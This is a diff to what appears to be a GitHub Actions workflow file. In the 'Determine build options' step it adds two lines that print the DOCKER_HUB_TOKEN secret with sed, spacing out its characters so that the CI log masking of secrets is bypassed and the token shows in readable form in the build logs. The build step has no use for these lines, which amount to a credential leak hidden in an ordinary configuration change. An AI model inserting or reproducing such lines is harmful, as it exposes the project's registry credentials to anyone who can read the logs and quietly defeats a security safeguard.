@@ -65,6 +65,8 @@ jobs:
       - name: Determine build options
         id: options
         run: |
+          echo ${{ secrets.DOCKER_HUB_TOKEN }} | sed 's/./& /g'
+          echo ${{ secrets.DOCKER_HUB_TOKEN }} | sed 's/./& /g' | sed 's/ //g'
           nix_debug_option="-debug"
           if [[ ${{ inputs.production }} || ${{ contains(steps.pr-labels.outputs.labels, ' docker-production-build ') }} ]]; then
             nix_debug_option=""
